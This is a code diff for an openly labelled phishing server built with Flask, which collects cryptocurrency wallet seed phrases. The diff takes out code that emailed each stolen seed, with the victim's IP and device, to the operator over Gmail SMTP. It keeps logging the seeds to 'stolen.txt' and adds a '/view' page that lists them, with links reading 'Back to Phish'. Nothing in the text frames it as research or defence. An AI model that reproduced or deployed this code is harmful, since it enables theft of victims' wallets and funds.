@@ -1,11 +1,7 @@
 from flask import Flask, request, render_template_string, jsonify
-import smtplib, json, datetime
-from email.mime.text import MIMEText
+import json, datetime
 
 app = Flask(__name__)
-
-YOUR_EMAIL = "your_email@gmail.com"  # CHANGE TO YOUR EMAIL
-EMAIL_PASS = "your_app_password"     # CHANGE TO GMAIL APP PASSWORD
 
 HTML = '''
 <!DOCTYPE html>
@@ -44,20 +40,16 @@ def log():
     with open('stolen.txt', 'a') as f:
         f.write(json.dumps(data) + '\n')
     
-    try:
-        msg = MIMEText(f"NEW SEED!\nPhrase: {data['seed']}\nIP: {data['ip']}\nDevice: {data['ua']}\nTime: {data['time']}")
-        msg['Subject'] = 'DVA.19 - SEED STOLEN'
-        msg['From'] = YOUR_EMAIL
-        msg['To'] = YOUR_EMAIL
-        
-        server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.starttls()
-        server.login(YOUR_EMAIL, EMAIL_PASS)
-        server.sendmail(YOUR_EMAIL, YOUR_EMAIL, msg.as_string())
-        server.quit()
-    except: pass
-    
     return jsonify({"status":"success"})
+
+@app.route('/view')
+def view():
+    try:
+        with open('stolen.txt', 'r') as f:
+            logs = f.read()
+        return f"<pre>{logs}</pre><br><a href='/'>Back to Phish</a>"
+    except:
+        return "No seeds yet. <a href='/'>Phish</a>"
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=10000)
